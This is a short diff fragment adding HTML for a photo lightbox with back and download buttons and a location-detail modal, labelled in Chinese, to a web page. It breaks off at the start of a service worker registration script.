+})();</script><div id="photoLightbox" class="lightbox hidden" onclick="closePhotoLightbox()">
+<div class="lightbox-topbar">
+<button class="lightbox-btn" onclick="event.stopPropagation();closePhotoLightbox()" aria-label="返回">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+</button>
+<button class="lightbox-btn" onclick="event.stopPropagation();downloadLightboxPhoto()" aria-label="下载">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+</button>
+</div>
+<img src="" alt="照片" id="lightboxImg">
+</div><div id="locDetailModal" class="modal-overlay hidden" onclick="if(event.target===this)closeLocDetail()"><div class="modal-card"><div class="modal-close" onclick="closeLocDetail()">×</div><div class="modal-title serif">定位详情</div><div id="locDetailContent"></div></div></div><script>
 (function(){
 if('serviceWorker' in navigator){
 window.addEventListener('load',function(){
